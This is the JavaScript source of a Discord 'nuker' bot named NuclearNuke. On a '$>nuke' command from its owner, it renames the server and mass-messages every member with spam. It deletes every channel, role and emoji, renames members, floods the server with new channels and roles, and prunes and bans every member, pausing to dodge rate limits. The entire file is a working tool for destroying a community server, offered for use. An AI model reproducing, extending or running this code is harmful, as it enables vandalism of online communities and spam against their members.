//Dependencies
const Discord = require("discord.js")
const Chalk = require("chalk")
const Delay = require("delay")

//Variables
const Bot = new Discord.Client()

var Self = {}
Self.token = ""
Self.user_id = ""
Self.configuration = {
    change_members_nickname_to: "Nuked using NuclearNuke",
    make_channel_called: "Nuked using NuclearNuke",
    send_message_to_created_channel: "This server is nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
    change_server_name_to: "Nuked using NuclearNuke",
    make_role_called: "Nuked using NuclearNuke",
    message_every_member: "One of the server your in has been nuked using NuclearNuke from https://github.com/i2rys/ODiscord"
}

//Functions
Self.log = function(type, message){
    if(type == "info"){
        console.log(`${Chalk.gray("[") + Chalk.blueBright("INFORMATION") + Chalk.gray("]")} ${message}`)
    }else if(type == "warn"){
        console.log(`${Chalk.gray("[") + Chalk.yellowBright("WARNING") + Chalk.gray("]")} ${message}`)
    }
}

//Main
Bot.on("ready", ()=>{
    Self.log("info", "Nuker is running.")
    Self.log("info", "To nuke specific current server just type $>nuke in any channel of the server that you want to nuke and make sure the nuker bot is there.")
    Self.log("info", "Make sure the bot has a high permission.")
})

Bot.on("message", async(message)=>{
    if(message.content == "$>nuke" && message.author.id == Self.user_id){
        Self.log("info", "Changing the server name.")
        message.guild.setName(Self.configuration.change_server_name_to).then(()=>{
            Self.log("info", "Server named successfully changed.")
        }).catch(()=>{
            Self.log("warn", "Unable to change the server name.")
        })

        Self.log("info", "Messaging every members.")
        message.guild.members.cache.forEach(member=>{
            member.send(Self.configuration.message_every_member).then(()=>{
                Self.log("info", `Server member called ${member.user.tag} successfully messaged.`)
            }).catch(()=>{
                Self.log("info", `Unable to send message to server member called ${member.user.tag}`)
            })
        })

        Self.log("info", "Deleting the server channels.")
        message.guild.channels.cache.forEach(channel=>{
            channel.delete().then(()=>{
                Self.log("info", `Server channel called ${channel.name} successfully deleted.`)
            }).catch(()=>{
                Self.log("warn", `Unable to delete server channel called ${channel.name}.`)
            })
        })

        Self.log("info", "Nicknaming every members.")
        message.guild.members.cache.forEach(member =>{
            member.setNickname(Self.configuration.change_members_nickname_to).then(()=>{
                Self.log("info", `Successfully nicknamed server member called ${member.user.tag}`)
            }).catch(()=>{
                Self.log("warn", `Unable to nickname server member called ${member.user.tag}`)
            })
        })

        Self.log("info", "Making 8 channels in the server and messaging them.")
        for( let i = 0; i <= 7; i++ ){
            message.guild.channels.create(Self.configuration.make_channel_called).then((channel)=>{
                channel.send(Self.configuration.send_message_to_created_channel)
                Self.log("info", `Successfully created a server channel called ${Self.configuration.make_channel_called}`)
            }).catch(()=>{
                Self.log("warn", `Unable to create a server channel called ${Self.configuration.make_channel_called}`)
            })
        }

        Self.log("info", "Removing all roles.")
        message.guild.roles.cache.forEach(role=>{
            role.delete().then(()=>{
                Self.log("info", `Server role called ${role.name} successfully deleted.`)
            }).catch(()=>{
                Self.log("warn", `Unable to delete server role called ${role.name}.`)
            })
        })

        Self.log("info", "Making 15 roles in the server.")
        for( let i = 0; i <= 14; i++ ){
            message.guild.roles.create({ "data": { name: Self.configuration.make_role_called } }) .then((channel)=>{
                Self.log("info", `Successfully created a server role called ${Self.configuration.make_role_called}`)
            }).catch(()=>{
                Self.log("warn", `Unable to create a server role called ${Self.configuration.make_role_called}`)
            })
        }

        Self.log("info", "Idling for 1 seconds to avoid getting limited.")
        await Delay(1000)

        Self.log("info", "Pruning server members.")
        message.guild.members.prune({ days: 1 }).then(()=>{
            Self.log("info", "Successfully pruned server members.")
        }).catch(()=>{
            Self.log("warn", "Unable to prune server members.")
        })

        Self.log("info", "Banning server members.")
        message.guild.members.cache.forEach(member =>{
            member.ban().then(()=>{
                Self.log("info", `Successfully banned server member called ${member.user.tag}`)
            }).catch(()=>{
                Self.log("warn", `Unable to ban server member called ${member.user.tag}`)
            })
        })

        Self.log("info", "Removing server emojis.")
        message.guild.emojis.cache.forEach(emoji =>{
            emoji.delete().then(()=>{
                Self.log("info", `Server emoji called ${emoji.name} successfully deleted.`)
            }).catch(()=>{
                Self.log("warn", `Unable to delete server emoji called ${emoji.name}`)
            })
        })

        await Delay(3000)
        Self.log("info", `Finished nuking in the server called ${message.guild.name}.`)
        Self.log("info", "Cleaning up, please wait for 7 seconds.")
        await Delay(7000)
        Self.log("info", "=========================================================== End ===========================================================")
    }
})

Bot.login(Self.token)
